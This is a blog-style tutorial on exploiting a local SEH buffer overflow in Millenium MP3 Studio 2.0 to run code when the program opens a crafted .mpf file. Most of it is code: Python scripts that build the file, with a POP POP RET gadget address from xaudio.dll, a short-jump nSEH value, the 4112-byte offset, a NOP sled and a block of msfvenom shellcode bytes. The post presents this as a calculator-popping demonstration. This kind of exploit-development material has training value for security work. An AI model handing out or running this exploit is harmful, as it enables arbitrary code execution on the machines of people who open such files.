---
layout: single
title: Local SEH overflow exploitation - Millenium MP3 Studio 2.0
---

**Getting started**

Start by attaching an immunity debugger to the running MP3 Studio process.

![local seh 1](localseh1.png)

The basic concept for exploiting a local Structured Exception Handler based buffer overflow, is that you will create a malicious text file that includes the payload that you were going to manually enter into a vulnerable input field, or instead of a text file, you will generate a malicious payload embedded within something other than a text file, for example this target application includes a buffer overflow when parsing certain types of data files, with an .mpf file extension, we will generate our malicious payload.

We can start the exploitation process by creating a basic python script that opens up a new file, and inputs a large buffer of data into it.

```python
from struct import *

malicious_file = "evil.mpf"

payload = "A" * 10000 # the maliciously large buffer

try:
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating a file named", malicious_file) 
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
except:
    print("[!] Error creating the exploit")
```

After running the newly-created script, you can now open this malicious .mpf  File in the MP3 Studio application, while the MP3 Studio application is still attached to immunity to bugger. Now you should be able to witness the buffer overflow vulnerability Being triggered, and you should experience an exception crash.

![local seh 2](localseh2.png)

If you look at the stack panel within Immunity, you can see the malicious payload has been written on to the stack.

![local seh 3](localseh2.png)

In order to actually exploit this, you need to obtain a POP POP RET  gadget, this can be done with MONA.py  via the !seh -n  command.

Running this command will search through the program for the needed sequence, this sequence will return execution flow back to the structured exception Handler, the goal is to overwrite both the exception Handler and the next structured exception Handler. 

![local seh 4](localseh4.png)

And the next structured exception Handler will be overwritten with this sequence that we discover, returning normal flow back to the user-controlled structured exception Handler, which you can then add a short jump over the next structure exception Handler, which then jumps into a NOP sled and to your final shellcode payload

The last important thing to do before actually constructing the final bits of this exploit, is to use the Metasploit pattern_create and pattern_offset tool in order to calculate the buffer size that you're triggering with this buffer overflow vulnerability

```
from struct import *

malicious_file = "evil.mpf"

# Log data, item 36
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018f948 overwritten with normal pattern : 0x31684630 (offset 4112), followed by 1712 bytes of cyclic data after the handler

seh = pack ('<I',  0x10014E98) # POP POP RET from xaudio.dll - using !mona seh -n
nseh = pack ('<I', 0x909032EB) # Short jump over the POPPOPRET filled NSEH

# shellcode payload that is generated from msfvenom
shellcode = (
"\xdb\xc8\xba\x50\xf4\xd9\x51\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x31\x31\x56\x18\x83\xee\xfc\x03\x56\x44\x16\x2c\xad\x8c\x54"
"\xcf\x4e\x4c\x39\x59\xab\x7d\x79\x3d\xbf\x2d\x49\x35\xed\xc1"
"\x22\x1b\x06\x52\x46\xb4\x29\xd3\xed\xe2\x04\xe4\x5e\xd6\x07"
"\x66\x9d\x0b\xe8\x57\x6e\x5e\xe9\x90\x93\x93\xbb\x49\xdf\x06"
"\x2c\xfe\x95\x9a\xc7\x4c\x3b\x9b\x34\x04\x3a\x8a\xea\x1f\x65"
"\x0c\x0c\xcc\x1d\x05\x16\x11\x1b\xdf\xad\xe1\xd7\xde\x67\x38"
"\x17\x4c\x46\xf5\xea\x8c\x8e\x31\x15\xfb\xe6\x42\xa8\xfc\x3c"
"\x39\x76\x88\xa6\x99\xfd\x2a\x03\x18\xd1\xad\xc0\x16\x9e\xba"
"\x8f\x3a\x21\x6e\xa4\x46\xaa\x91\x6b\xcf\xe8\xb5\xaf\x94\xab"
"\xd4\xf6\x70\x1d\xe8\xe9\xdb\xc2\x4c\x61\xf1\x17\xfd\x28\x9f"
"\xe6\x73\x57\xed\xe9\x8b\x58\x41\x82\xba\xd3\x0e\xd5\x42\x36"
"\x6b\x29\x09\x1b\xdd\xa2\xd4\xc9\x5c\xaf\xe6\x27\xa2\xd6\x64"
"\xc2\x5a\x2d\x74\xa7\x5f\x69\x32\x5b\x2d\xe2\xd7\x5b\x82\x03"
"\xf2\x3f\x45\x90\x9e\x91\xe0\x10\x04\xee")

payload = "A" * 4112 # after calculating the buffer size that triggers this specific vulnerability
payload += nseh
payload += seh
payload += "\x90" * 100
payload += shellcode

# Log data, item 24
# Address=10014E98
# Message=  0x10014e98 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [xaudio.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.0.7.0 (c:\mp3-millennium\xaudio.dllpayload_execution = open(malicious_file, 'w+')

try:
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating a file named", malicious_file) 
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
    print("[x] Sending junk")
    print("[x] Sending POP POP RET via controlled SEH handler")
    print("[x] Jumping to shellcode")
except:
    print("[!] Error creating the exploit")
```

Now you can pop a calculator through this local SEH overflow.

![local seh 5](localseh5.png)
